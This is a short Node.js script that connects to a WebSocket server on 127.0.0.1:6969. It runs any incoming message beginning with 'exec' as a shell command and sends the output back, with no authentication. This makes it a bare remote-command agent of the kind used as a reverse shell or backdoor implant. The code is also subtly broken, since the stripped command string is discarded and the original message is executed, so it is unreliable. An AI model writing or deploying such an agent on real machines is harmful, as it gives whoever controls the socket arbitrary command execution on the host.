

const WS = require('ws')
const { exec } = require('child_process')
const ws = new WS("ws://127.0.0.1:6969")

function cmd(cmd) {
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            ws.send(`ERORR ::: ${err}`)
            return
        } else if (stderr) {
            ws.send(`STDERR ::: ${stderr}`)
            return
        }
        console.log(stdout)
        ws.send(stdout)
    })
}


ws.on("message", (message) => {
    const msg = message.toString()
    console.log(message.toString())
    if (msg.split(" ")[0] === "exec") { // checks if there is exec command to execute the cmd.
        msg.replace("exec","")
        cmd(message.toString())
    }
})